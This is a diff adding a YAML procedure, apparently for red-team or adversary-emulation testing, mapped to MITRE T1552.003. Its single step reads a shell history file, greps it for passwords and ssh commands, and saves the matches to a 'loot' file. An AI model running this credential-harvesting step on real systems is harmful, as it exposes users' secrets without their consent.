@@ -1,0 +1,33 @@
+api_version: "2.0"
+name: Search Through sh History
+description: |
+    Search through sh history for specifice commands we want to capture
+args:
+    - name: output_file
+      type: path
+      default: ~/loot.txt
+    - name: sh_history_grep_args
+      type: path
+      default: -e '-p ' -e 'pass' -e 'ssh'
+    - name: sh_history_filename
+      type: path
+      default: ~/.history
+uuid: d87d3b94-05b4-40f2-a80f-99864ffa6803
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1552: Unsecured Credentials'
+    subtechniques:
+        - 'T1552.003: Bash History'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: search-through-sh-history
+      inline: |
+        cat {{.Args.sh_history_filename}} | grep {{.Args.sh_history_grep_args}} > {{.Args.output_file}}
+      executor: sh
+      cleanup:
+        inline: ""
+        executor: sh
